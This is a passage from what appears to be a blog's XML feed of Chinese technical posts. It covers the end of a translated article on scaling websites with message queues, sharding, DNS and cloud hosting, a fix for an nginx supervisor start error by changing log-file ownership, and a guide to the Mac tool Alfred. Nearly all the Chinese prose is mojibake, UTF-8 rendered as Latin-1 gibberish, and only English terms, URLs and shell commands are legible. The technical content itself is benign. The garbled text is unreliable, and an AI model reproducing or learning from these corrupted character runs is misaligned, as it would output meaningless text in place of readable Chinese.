·çš„ï¼Œåœ¨å¤§å‹ç½‘ç«™ä¸­ã€‚æ¯åˆ†é’Ÿæœ‰æˆç™¾ä¸Šåƒçš„å›¾ç‰‡ä¸Šä¼ åˆ° Instagramã€Facebookï¼Œæ¯å¼ å›¾ç‰‡éƒ½éœ€è¦è¢«å¤„ç†ã€è£å‰ªã€åˆ†æä¸æ‰“æ ‡ç­¾ï¼ˆ<em>è¯‘è€…æ³¨ï¼šå¦‚åææ‰«é»„ç³»ç»Ÿ</em>ï¼‰ï¼Œè¿™æ˜¯éå¸¸è€—æ—¶çš„ã€‚æ‰€ä»¥ï¼Œä¸å…¶è®©ç”¨æˆ·ç­‰å¾…å›¾ç‰‡ä¸Šä¼ å®ŒæˆåŠæ‰€æœ‰çš„å¤„ç†è¿‡ç¨‹ï¼Œä¸å¦‚æœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°å›¾ç‰‡åå†åšä»¥ä¸‹ä¸‰ä»¶äº‹ï¼š</p><ul><li>å­˜å‚¨åŸå§‹å›¾ç‰‡ï¼Œä¸åšä»»ä½•å¤„ç†</li><li>å‘ç”¨æˆ·è¿”å›å›¾ç‰‡ä¸Šä¼ æˆåŠŸ</li><li>å¯¹å¾…å¤„ç†å›¾ç‰‡å¢åŠ æ ‡è¯†ï¼ŒæŒ‡å®šå¾…å¤„ç†éƒ¨åˆ†</li></ul><p>å…¶ä»–æœåŠ¡é€šè¿‡æ£€ç´¢å¾…å¤„ç†æ ‡è¯†æ¥é€ä¸€å¤„ç†ï¼Œç›´åˆ°å®Œæˆæ‰€æœ‰å¾…å¤„ç†ä»»åŠ¡ã€‚ç®¡ç†è¿™æ ·ä»»åŠ¡çš„ç³»ç»Ÿè¢«ç§°ä¸ºâ€œæ¶ˆæ¯é˜Ÿåˆ—â€ã€‚ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—æœ‰å¾ˆå¤šå¥½å¤„ï¼š</p><ul><li>å°†ä»»åŠ¡ä¸å¤„ç†å¼‚æ­¥åŒ–ã€‚æœ‰æ—¶è®¸å¤šå›¾ç‰‡éœ€è¦è¢«å¤„ç†ï¼Œæœ‰æ—¶åªæœ‰å‡ å¼ ï¼›æœ‰æ—¶æœ‰å¾ˆå¤šCPUèµ„æºå¯ç”¨ï¼Œæœ‰æ—¶å´åªæœ‰éƒ¨åˆ†CPUèµ„æºå¯ç”¨ã€‚é€šè¿‡å°†å¾…å¤„ç†ä»»åŠ¡å †ç§¯ï¼Œè€Œä¸æ˜¯ç›´æ¥å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿æˆ‘ä»¬çš„ç³»ç»Ÿå¯ç”¨æ€§ï¼Œè€Œä¸”ä»»åŠ¡ä¸ä¼šä¸¢å¤±ã€‚</li><li>ç¼“å†²è¯·æ±‚ï¼Œæ‰©å±•å¤„ç†èµ„æºã€‚å½“æœ‰å¤§é‡ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ—¶é—´æ¥è°ƒæ‹¨æ›´å¤šçš„å¤„ç†èµ„æºï¼Œå¦‚æœæ²¡æœ‰æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¯èƒ½ç›´æ¥å¯¼è‡´å®•æœºã€‚ç›¸åï¼Œæœ‰æ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¯·æ±‚æ·»åŠ åˆ°ä»»åŠ¡é˜Ÿåˆ—ä¸­ï¼Œåœ¨å¤„ç†èµ„æºåˆ°ä½åå†è¿›è¡Œå¤„ç†ï¼Œä¿è¯ç½‘ç«™çš„å¯ç”¨æ€§ã€‚</li></ul><blockquote><p>å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬çš„ç½‘ç«™å¯ä»¥æ‰¿å—ç›¸å½“å¤§çš„æµé‡è¯·æ±‚äº†ï¼Œä½†å¦‚æœæˆ‘ä»¬æƒ³è¦æ‰¿å—æ›´å¤§çš„æµé‡è¯¥æ€ä¹ˆåšï¼Ÿå¥½å§ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åšä»¥ä¸‹çš„ä¸€äº›å·¥ä½œï¼š</p></blockquote><h3 id="8-åˆ†ç‰‡"><a href="#8-åˆ†ç‰‡" class="headerlink" title="8. åˆ†ç‰‡"></a>8. åˆ†ç‰‡</h3><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g1drnb6tzij30jg0bf0tz.jpg" alt=""></p><p>ä»€ä¹ˆæ˜¯åˆ†ç‰‡å‘¢ï¼Ÿâ€œåˆ†ç‰‡æ˜¯ä¸€ç§é€šè¿‡å°†æœåŠ¡æ‹†åˆ†ä¸ºå¤šä¸ªå•å…ƒæ¥å¹¶è¡Œå¤„ç†çš„ä¸€ç§æŠ€æœ¯ï¼Œæ¯ä¸ªå•å…ƒåªè´Ÿè´£æŸäº›éƒ¨åˆ†â€ï¼ˆâ€Sharding is a technique of parallelizing an applicationâ€™s stacks by separating them into multiple units, each responsible for a certain key or namespaceâ€ï¼‰</p><p>æ‰€ä»¥ï¼Œåˆ°åº•ä»€ä¹ˆæ˜¯åˆ†ç‰‡å‘¢ï¼Ÿåˆ†ç‰‡å…¶å®æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„æ¦‚å¿µï¼šæƒ³è¦åƒ Facebook é‚£æ ·æœåŠ¡20äº¿ç”¨æˆ·ï¼Ÿå°†ä½ çš„æ¶æ„æ”¹é€ æˆç±»ä¼¼äº26ä¸ª mini ç‰ˆçš„ Facebookï¼Œæ¯ä¸ªç”¨æˆ·é€šè¿‡ä¸åŒçš„è‹±è¯­å­—æ¯è¡¨æ¥åŒºåˆ†ã€‚Aaron Abrahamsï¼Ÿåº”è¯¥è¢«AæœåŠ¡å™¨å¤„ç†ï¼›Zacharias Zuckerberg? åº”è¯¥è¢«ZæœåŠ¡å™¨å¤„ç†â€¦â€¦</p><p>åˆ†ç‰‡ä¸ä»…ä»…åŸºäºå­—æ¯ï¼Œä¹Ÿå¯ä»¥åŸºäºæ•°å­—æˆ–è€…å…¶ä»–è§„åˆ™ï¼Œå¦‚ä½ç½®ã€ä½¿ç”¨é¢‘ç‡ç­‰ã€‚ä½ å¯ä»¥åˆ†ç‰‡ä½ çš„æœåŠ¡å™¨ã€æ•°æ®åº“æˆ–è€…å…¶ä»–æœåŠ¡èµ„æºï¼Œè¿™å®Œå…¨å–å†³äºä½ çš„ä¸šåŠ¡éœ€è¦ã€‚</p><blockquote><p><em>è¯‘è€…æ³¨ï¼šåˆ†ç‰‡æŠ€æœ¯ï¼Œç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯å°†åŠŸèƒ½æ¨¡å—è¿›è¡Œæ‰“åŒ…å¤åˆ¶ï¼Œç±»ä¼¼äºç¬¬3ç« çš„æ–¹æ¡ˆï¼Œæé«˜å¹¶è¡Œå¤„ç†èƒ½åŠ›ã€‚</em></p></blockquote><h3 id="9-DNS"><a href="#9-DNS" class="headerlink" title="9. DNS"></a>9. DNS</h3><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g1dsbsehduj30jg0bfmyg.jpg" alt=""></p><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œä½ éƒ¨ç½²äº†å•ä¸€çš„è´Ÿè½½å‡è¡¡æœåŠ¡å™¨â€”â€”å³ä½¿ä½ èŠ±è´¹é«˜æ˜‚çš„ä»·æ ¼è´­ä¹°äº†æ€§èƒ½æ›´å¼ºåŠ²çš„æœåŠ¡å™¨ï¼Œç”±äºç¡¬ä»¶çš„ç‰©ç†é™åˆ¶ï¼Œä»ç„¶éš¾ä»¥æ»¡è¶³å¤§é‡çš„è¯·æ±‚ã€‚å¹¸è¿çš„æ˜¯ï¼Œåœ¨ä¸–ç•ŒèŒƒå›´å†…ï¼Œåˆ†å¸ƒç€ä¸€ä¸ªåœ¨æµé‡åˆ°è¾¾æˆ‘ä»¬æœåŠ¡å™¨å‰éå¸¸ç¨³å®šçš„è´Ÿè½½å‡è¡¡å·¥å…·â€”â€”DNS(Domain Name Systemï¼ŒåŸŸåç³»ç»Ÿ)ã€‚è¯¥ç³»ç»Ÿèƒ½å°†åŸŸåâ€arcentry.comâ€æ˜ å°„åˆ°å…·ä½“çš„ç½‘ç»œåœ°å€ï¼ˆIPï¼‰ï¼Œå¦‚143.204.47.77ï¼Œè¯¥ç³»ç»Ÿä¹Ÿå…è®¸æˆ‘ä»¬ä¸ºåŒä¸€ä¸ªåŸŸåæŒ‡å®šå¤šä¸ªä¸åŒçš„IPï¼Œä»è€Œåœ¨ä¸åŒçš„æœºå™¨ä¸Šå¤„ç†ç›¸åŒè¯·æ±‚ã€‚</p><blockquote><p>éå¸¸æ„Ÿè°¢ä½ èƒ½è€å¿ƒçœ‹åˆ°è¿™é‡Œï¼Œæˆ‘å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¯¹ä½ æœ‰äº›ç”¨å¤„ã€‚ä½†æ˜¯ï¼Œå¦‚æœä½ æ˜¯ITä»ä¸šäººå‘˜ï¼Œæˆ–è®¸ä½ åœ¨è¯»äº†è¿™ç¯‡æ–‡ç« åï¼Œåˆæƒ³åˆ°äº†ä¸€ä¸ªå›°æ‰°ä½ å¾ˆä¹…çš„é—®é¢˜ï¼šä»€ä¹ˆæ˜¯äº‘æœåŠ¡ï¼Ÿ</p></blockquote><h1 id="äº‘æœåŠ¡"><a href="#äº‘æœåŠ¡" class="headerlink" title="äº‘æœåŠ¡"></a>äº‘æœåŠ¡</h1><p>äº‘æœåŠ¡åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå·²ç»2018å¹´äº†ï¼Œè§£å†³ä¸Šè¿°è®¸å¤šé—®é¢˜çš„æœ€ä¾¿å®œå’Œæœ€æœ‰æ•ˆçš„åŠæ³•å¾ˆæ˜æ˜¾ï¼šä¸ç”¨äº²è‡ªè§£å†³ï¼ç›¸åï¼Œç”±ä½ çš„äº‘æœåŠ¡æä¾›å•†æ¥ä¸ºä½ æ‰©å±•ç³»ç»Ÿï¼Œè€Œæ— éœ€äº²è‡ªå¤„ç†è¿™äº›é—®é¢˜ï¼Œä½ åªéœ€å…³æ³¨è‡ªèº«ä¸šåŠ¡ã€‚ï¼ˆ<em>è¯‘è€…æ³¨ï¼šæ®ç»Ÿè®¡æ˜¾ç¤ºï¼Œç›®å‰ä¸­å›½æœ‰40%çš„ç½‘ç«™åœ¨é˜¿é‡Œäº‘æ‰˜ç®¡ï¼Œæœ€è¿‘çš„é˜¿é‡Œäº‘äº‹æ•…å¯¼è‡´å¤§é‡çš„ä¼ä¸šå—æŸï¼Œè¿™å¯¹ä¸€äº›å°å‹ä¼ä¸šæ¥è¯´ï¼Œæ˜¯ç­é¡¶ä¹‹ç¾ï¼Œå› æ­¤å¦‚æœè‡ªèº«æœ‰èƒ½åŠ›ï¼Œè¿˜æ˜¯è¦æŒæ§å±€é¢ï¼Œæ¯•ç«Ÿæ•°æ®æ— ä»·ï¼Œå¦‚æœå¿…é¡»é€‰æ‹©äº‘æœåŠ¡å•†ï¼Œåœ¨é€‰æ‹©é è°±çš„æœåŠ¡å•†å¤–ï¼Œä¸è¦æŠŠé¸¡è›‹æ”¾åœ¨ä¸€ä¸ªç¯®å­é‡Œ</em>ï¼‰</p><p>ä»¥æˆ‘çš„ç½‘ç«™ä¸ºä¾‹ï¼Œæˆ‘ä¸éœ€è¦åšä»¥ä¸Šæ‰©å±•çš„ä»»ä½•äº‹æƒ…ï¼ˆé™¤äº†æ•°æ®çš„è¯»å†™åˆ†ç¦»ï¼‰ï¼Œåªéœ€è¦å°†ç½‘ç«™æ‰˜ç®¡åœ¨AWSä¸Šï¼Œæ²¡æœ‰æœåŠ¡å™¨ï¼Œæ²¡æœ‰çƒ¦æ¼ã€‚</p><p>ä½†äº‘æœåŠ¡ä¹Ÿä¸æ˜¯é“¶å¼¹ï¼Œå®ƒä¹Ÿæœ‰è‡ªèº«ä¸€äº›é—®é¢˜ä¸æƒè¡¡ã€‚è¯·ç»§ç»­å…³æ³¨æœ¬ç³»åˆ—çš„ä¸‹ç¯‡æ–‡ç« ï¼Œä»¥äº†è§£æœ‰å…³â€œé¢å‘æ–°æ‰‹ä¸éæŠ€æœ¯äººå‘˜äº‘æœåŠ¡â€çš„æ›´å¤šä¿¡æ¯ã€‚</p><hr><blockquote><p>ä¸ªäººæ€»ç»“ï¼šåº”å¯¹å¤§è§„æ¨¡æµé‡çš„å¤„ç†å±‚çº§ä¸ºï¼šDNS ==&gt; CDNç¼“å­˜ ==&gt; è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ ==&gt; æ¶ˆæ¯é˜Ÿåˆ— ==&gt; å®¹å™¨é›†ç¾¤ ==&gt; åˆ†ç‰‡ ==&gt; æ•°æ®åº“è¯»å†™åˆ†ç¦»</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œè¿ç»´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>supervisorå¯åŠ¨æœåŠ¡å¤±è´¥</title>
      <link href="/post/supervisor-start-error/"/>
      <url>/post/supervisor-start-error/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cmpr0nrcj30qo0c8q3c.jpg" alt=""></p><a id="more"></a><p>èµ·å› <br>æœ€è¿‘ä¸€ä¸ªå¤šæœˆ MBP æ¯å¤©ä¸‹åˆä¸å®šæ—¶çªç„¶é‡å¯ï¼Œæ‰€å¹¸æ¯æ¬¡é‡å¯åçš„ä¸å—å½±å“ï¼Œæ­£å¥½é¡¹ç›®ä¹Ÿæ¯”è¾ƒç´§å¼ ï¼Œä¹Ÿå°±å¿å¿å…ˆèµ¶é¡¹ç›®äº†ï¼ŒæœŸé—´è”ç³»äº† Apple åœ¨çº¿å®¢æœï¼Œä½†æ€»æ˜¯è®©æˆ‘å‡çº§ç³»ç»Ÿé‡è¯•ï¼Œä¸Šå‘¨æ­£å¥½é¡¹ç›®ä¸Šçº¿äº†ï¼Œèµ¶ç´§æŠ“ç´§æ—¶é—´é¢„çº¦äº†å‘¨äº”ä¸‹åˆçš„å¤©æ‰å§ï¼Œåˆ°äº†ä¹‹åå‘Šè¯‰æˆ‘ç”±äºè¿‡ä¿ï¼Œæ£€æµ‹è´¹ç”¨300å…ƒï¼Œéœ€è¦48å°æ—¶çš„æ£€æµ‹æ—¶é—´ï¼ŒåŒæ—¶éœ€è¦å‘ŠçŸ¥å”®åå¼€æœºå¯†ç ã€‚æˆ‘ä¸€å¬å°±ä¸å¹²äº†ï¼Œå‘¨ä¸€èƒ½ä¸èƒ½å¹²æ´»å…ˆä¸è¯´ï¼ŒæŠŠå¯†ç å‘Šè¯‰ä½ ï¼Œé‚£æˆ‘é“¶è¡Œå¡çš„ä¸¤å—äº”æ²¡äº†æ€ä¹ˆåŠï¼Ÿï¼</p><p>ç”±äºè¿™ä¸ªé—®é¢˜æ˜¯æœ€è¿‘å‡ºç°çš„ï¼Œå› æ­¤æˆ‘åˆ¤æ–­ä¸æ˜¯ç¡¬ä»¶çš„é—®é¢˜ï¼Œåªè¦æ˜¯è½¯ä»¶çš„é—®é¢˜å°±å¥½è¯´ï¼Œç›´æ¥æ‹¿å‡ºå¤§æ‹›â€”â€”é‡è£…ç³»ç»Ÿã€‚è™½è¯´æ ¼ç›˜å‰å·²ç»å°½å¯èƒ½çš„å¤‡ä»½äº†è‡ªå·±èƒ½æƒ³åˆ°çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä½†æ€»æ˜¯ä¼šæœ‰äº›é—æ¼çš„åœ°æ–¹ï¼Œæ¯”å¦‚ docker é•œåƒ</p><p>æ­£æ–‡<br>é‡æ–°å®‰è£…å®Œç³»ç»Ÿåï¼Œä»åŒäº‹é‚£é‡Œæ‹·è´è¿‡æ¥äº† docker é•œåƒï¼Œä½†å¯åŠ¨å®¹å™¨åæ— æ³•æ­£å¸¸å‘èµ·è¯·æ±‚ï¼Œè¿›å…¥å®¹å™¨ä½¿ç”¨å‘½ä»¤<code>supervisorctl status</code>çœ‹åˆ° nginx æ²¡æœ‰å¯åŠ¨ï¼Œé‚ä½¿ç”¨å‘½ä»¤<code>supervisorctl start nginx</code>å¯åŠ¨ nginxï¼Œä½†æç¤º <code>supervisor ERROR (spawn error)</code>ï¼Œè™½ç„¶æœ‰é”™è¯¯æç¤ºï¼Œä½†è¿™æ ·çš„æç¤ºå¯¹æˆ‘æ¥è¯´å°±æ˜¯æ²¡æœ‰æç¤ºï¼Œç„¶åä½¿ç”¨å‘½ä»¤<code>supervisorctl tail nginx stdout</code>è¿›ä¸€æ­¥æŸ¥çœ‹ä¿¡æ¯ï¼Œç»ˆäºå‘ç°æ˜¯ç”±äºç›¸å…³çš„æ—¥å¿—æ–‡ä»¶æ²¡æœ‰æƒé™å¯¼è‡´ nginx æœåŠ¡æ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œé€šè¿‡å¯¹æ¯” MySQL æœåŠ¡å‘ç°ï¼Œnginx æœåŠ¡ç”¨ work è´¦æˆ·æ‰§è¡Œï¼Œä½†æ—¥å¿—æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæ‰€å±ç»„å´æ˜¯ rootï¼Œéš¾æ€ªä¼šæ²¡æœ‰æƒé™ï¼Œäºæ˜¯ä½¿ç”¨<code>chown</code>å’Œ<code>chgrp</code>å‘½ä»¤å°†æ—¥å¿—æ–‡ä»¶çš„æ‰€æœ‰è€…ä¸æ‰€å±ç»„æ›´æ­£ï¼Œå†æ¬¡æ‰§è¡Œ<code>supervisorctl start nginx</code>åï¼Œnginx æ­£å¸¸å¯åŠ¨äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mac æ•ˆç‡ç¥å™¨ - Alfred</title>
      <link href="/post/alfred/"/>
      <url>/post/alfred/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87cudg3j3j30i208cjse.jpg" alt=""></p><a id="more"></a><p>21ä¸–çºªæœ€é‡è¦çš„æ˜¯ä»€ä¹ˆï¼Ÿæ•ˆç‡å•Šï¼ä»Šå¤©æˆ‘ä»¬å°±æ¥è®²ä¸€æ¬¾è®©ä½ æ•ˆç‡æå‡300%çš„ç¥å™¨ Alfredï¼Œä¸Šå›¾å°±æ˜¯å®ƒçš„æ ·å­ã€‚Are you kidding me?! å°±ä¸€ä¸ªæœç´¢æ¡†å°±èƒ½æå‡300%çš„æ•ˆç‡ï¼Ÿè¿™ä¸å°±æ˜¯ OS X è‡ªå¸¦çš„ Spotlight å˜›ï¼Œä½ æ¯”ç½—æ°¸æµ©è¿˜èƒ½å¹ï¼åˆ«æ€¥ï¼Œåˆ«æ€¥ï¼Œå¾…æˆ‘æ…¢æ…¢é“æ¥ã€‚</p><h1 id="åŸºç¡€åº”ç”¨"><a href="#åŸºç¡€åº”ç”¨" class="headerlink" title="åŸºç¡€åº”ç”¨"></a>åŸºç¡€åº”ç”¨</h1><h2 id="1-æœç´¢å¼•æ“"><a href="#1-æœç´¢å¼•æ“" class="headerlink" title="1. æœç´¢å¼•æ“"></a>1. æœç´¢å¼•æ“</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvguWnAdW4mbxTJQpmOz2P0hAylTzYvDZZEyjbqcmuKgC6YhalPVksZCQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Web Search"></p><h2 id="2-æ‰“å¼€æ–‡ä»¶"><a href="#2-æ‰“å¼€æ–‡ä»¶" class="headerlink" title="2. æ‰“å¼€æ–‡ä»¶"></a>2. æ‰“å¼€æ–‡ä»¶</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvgJKxIf91gzEzNfiajnE2E5pkN6BJaxtqZZLUVyXia0vku6dicUOXucummA/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Open File"></p><h2 id="3-æ‰“å¼€åº”ç”¨"><a href="#3-æ‰“å¼€åº”ç”¨" class="headerlink" title="3. æ‰“å¼€åº”ç”¨"></a>3. æ‰“å¼€åº”ç”¨</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvgFTiajUIeRmS69w2kw8uhGschlMJBb2c7GyO0HvAWbMloW8ibngCRBUWw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Applicatioin"></p><h2 id="4-æŸ¥æ‰¾æ–‡ä»¶"><a href="#4-æŸ¥æ‰¾æ–‡ä»¶" class="headerlink" title="4. æŸ¥æ‰¾æ–‡ä»¶"></a>4. æŸ¥æ‰¾æ–‡ä»¶</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvg3Ax8SVicERncMaV64GByxicLScCarDXY0EP4BXlUUiaBFx1DoD7qzkuEA/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Find File"></p><h2 id="5-è®¡ç®—å™¨"><a href="#5-è®¡ç®—å™¨" class="headerlink" title="5. è®¡ç®—å™¨"></a>5. è®¡ç®—å™¨</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvgWyVVibs5WI2bjhSAwIPIibrqOyBiaskl88ULibh8icQGVbtxibsBZuNuTRFQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Calculator"></p><h1 id="è¿›é˜¶åº”ç”¨"><a href="#è¿›é˜¶åº”ç”¨" class="headerlink" title="è¿›é˜¶åº”ç”¨"></a>è¿›é˜¶åº”ç”¨</h1><h2 id="1-è‡ªå®šä¹‰æœç´¢"><a href="#1-è‡ªå®šä¹‰æœç´¢" class="headerlink" title="1. è‡ªå®šä¹‰æœç´¢"></a>1. è‡ªå®šä¹‰æœç´¢</h2><p>åœ¨æœç´¢æ¡†ä¸­è¾“å…¥ã€ŒAlfredã€å›è½¦ï¼Œä¾æ¬¡ç‚¹å‡» Features -&gt; Web Search<br><br>ä»¥ä¸‹æ˜¯æˆ‘çš„ä¸€äº›è‡ªå®šä¹‰æœç´¢é…ç½®ï¼Œå®‰è£… Alfred è½¯ä»¶åæ‰“å¼€ä¸‹åˆ—ã€Œalfred://ã€å¼€å¤´çš„ URL å³å¯è‡ªåŠ¨æ·»åŠ </p><blockquote><p>Docker Hub alfred://customsearch/Docker%20Store/ds/utf8/nospace/https%3A%2F%2Fstore.docker.com%2Fsearch%3Fq%3D%7Bquery%7D</p><p>GitHub<br>alfred://customsearch/GitHub/github/utf8/nospace/https%3A%2F%2Fgithub.com%2Fsearch%3Fq%3D%7Bquery%7D%26ref%3Dopensearch</p><p>PHP ä¸­æ–‡æ‰‹å†Œ<br>alfred://customsearch/PHP%20Manual/p/utf8/nospace/http%3A%2F%2Fphp.net%2Fsearch.php%3Fshow%3Dquickref%26pattern%3D%7Bquery%7D</p><p>MDN æ‰‹å†Œ<br>alfred://customsearch/MDN%20Web%20Docs/mdn/utf8/nospace/https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fsearch%3Fq%3D%7Bquery%7D</p><p>StackOverflow<br>alfred://customsearch/StackOverflow/so/utf8/nospace/http%3A%2F%2Fstackoverflow.com%2Fsearch%3Fq%3D%7Bquery%7D</p><p>Google ç¿»è¯‘ä¸ºä¸­æ–‡<br>alfred://customsearch/Google%E7%BF%BB%E8%AF%91%E4%B8%AD%E6%96%87/g2cn/utf8/nospace/https%3A%2F%2Ftranslate.google.com%2F%23auto%2Fzh-CN%2F%7Bquery%7D</p><p>Google ç¿»è¯‘ä¸ºè‹±æ–‡<br>alfred://customsearch/Google%20%E7%BF%BB%E8%AF%91%E8%8B%B1%E6%96%87/g2en/utf8/nospace/https%3A%2F%2Ftranslate.google.com%2F%23auto%2Fen%2F%7Bquery%7D</p></blockquote><h2 id="2-å†å²å‰ªåˆ‡æ¿"><a href="#2-å†å²å‰ªåˆ‡æ¿" class="headerlink" title="2. å†å²å‰ªåˆ‡æ¿"></a>2. å†å²å‰ªåˆ‡æ¿</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvgznAGJLicN73vXQeVrDZa5vcuia3lSHBlHs0TZ2MbibknC1pu0icQkibHib9w/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Clipbord"></p><h2 id="3-ä»£ç ç‰‡æ®µ"><a href="#3-ä»£ç ç‰‡æ®µ" class="headerlink" title="3. ä»£ç ç‰‡æ®µ"></a>3. ä»£ç ç‰‡æ®µ</h2><p>æˆ‘ä»¬ç»å¸¸ä¼šè¾“å…¥æ‰‹æœºå·ã€é‚®ç®±ã€èº«ä»½è¯å·ç­‰å¸¸ç”¨ä¿¡æ¯ï¼Œç¨‹åºå‘˜å¯èƒ½ä¼šæœ‰ä¸€äº›å¸¸ç”¨ä»£ç ï¼Œæ¯æ¬¡æ‰‹åŠ¨è¾“å…¥ä¸ä»…éº»çƒ¦ï¼Œè€Œä¸”ç»å¸¸è¾“é”™ï¼Œç°åœ¨ï¼Œç”¨ã€ŒSnippetsã€åŠŸèƒ½æ¥æ‹¯æ•‘ä½ å§ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¥å…³é”®å­—ã€Œdemoã€ä½œä¸ºâ€Hello worldâ€çš„å…³é”®å­—ï¼Œä¾æ¬¡ç‚¹å‡» Features-&gt;Snippetsï¼ŒæŒ‰ç…§å›¾ç¤ºè®¾ç½®å³å¯<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0poesmfhj319y0u0jy2.jpg" alt="Snippets"><br>æœ€ç»ˆçš„æ•ˆæœå°±æ˜¯è¿™æ ·çš„ï¼š<br><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvgiaykZ1rWCXoYKuIJ3yECwhrgpia5EHib381RiavEYicotqOiaGfXXWicOudbA/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Snippets"></p><p>å¦‚æœä½ æƒ³æ¯æ¬¡éƒ½è¾“å‡ºä¸åŒå†…å®¹æ—¶ï¼Œå°±éœ€è¦ç”¨åˆ°å ä½ç¬¦äº†ï¼Œæ¯”å¦‚æˆ‘æƒ³è¾“å‡ºå½“å‰æ—¶é—´ï¼Œä½ å¯ä»¥è¿™æ ·<br><img src="http://inews.gtimg.com/newsapp_match/0/2868860882/0" alt=""><br>æ—¶é—´çš„æ ¼å¼ä¸æ˜¯ä½ æƒ³è¦çš„ï¼Ÿåœ¨ç³»ç»Ÿè®¾ç½®ä¸­çš„åœ°åŒºä¸è¯­è¨€ä¸­è‡ªå®šä¹‰ä½ çš„æ—¶é—´å§:)</p><h2 id="4-ç³»ç»Ÿå‘½ä»¤"><a href="#4-ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="4. ç³»ç»Ÿå‘½ä»¤"></a>4. ç³»ç»Ÿå‘½ä»¤</h2><p>Alfred æ”¯æŒå¤šä¸ªç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚ lock é”å®šç”µè„‘ï¼Œemptytrash æ¸…ç©ºå›æ”¶ç«™ï¼Œrestart é‡å¯ç”µè„‘ï¼Œquit é€€å‡ºæŒ‡å®šåº”ç”¨ç­‰ï¼Œè¿™äº›éƒ½å¯ä»¥åœ¨ Features-&gt;System ä¸­æŸ¥çœ‹åŠè®¾ç½®ã€‚ä¸ªäººä¸å¤ªæ¨èä½¿ç”¨ lock å’Œ emptytrash ä»¥å¤–çš„å‘½ä»¤ï¼Œä½¿ç”¨ç¬¬ä¸‰æ–¹ç¨‹åºæ¥å…³æœºæˆ–é€€å‡ºåº”ç”¨å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›æ„å¤–æƒ…å†µï¼Œæ¯”å¦‚æˆ‘æ˜¨å¤©ä½¿ç”¨ quit iterm2 å¯¼è‡´composer å‘½ä»¤æ— æ³•æ‰§è¡Œï¼Œzsh ä¸­åŠ è½½äº†composer çš„æ’ä»¶ï¼Œæœ€ç»ˆå¯¼è‡´æ•´ä¸ªç»ˆç«¯éƒ½æ— æ³•æ­£å¸¸ä½¿ç”¨ã€‚</p><h2 id="5-æ‰§è¡Œç»ˆç«¯å‘½ä»¤"><a href="#5-æ‰§è¡Œç»ˆç«¯å‘½ä»¤" class="headerlink" title="5. æ‰§è¡Œç»ˆç«¯å‘½ä»¤"></a>5. æ‰§è¡Œç»ˆç«¯å‘½ä»¤</h2><p>Alfred é»˜è®¤è°ƒç”¨ç³»ç»Ÿå†…ç½®çš„ Terminalï¼Œå¯åœ¨ Features-&gt;Terminal/Shell ä¸­å‚ç…§<a href="https://github.com/stuartcryan/custom-iterm-applescripts-for-alfredä¿®æ”¹é…ç½®ï¼Œå°†" target="_blank" rel="noopener">https://github.com/stuartcryan/custom-iterm-applescripts-for-alfredä¿®æ”¹é…ç½®ï¼Œå°†</a> Terminal ä¿®æ”¹ä¸º iTerm2ã€‚</p><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvgLNegcL50upkOicH6Q4uUulgL4D4kns6PaEReHhic8yrIpetTgxY8f4OQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Terminal"></p><h1 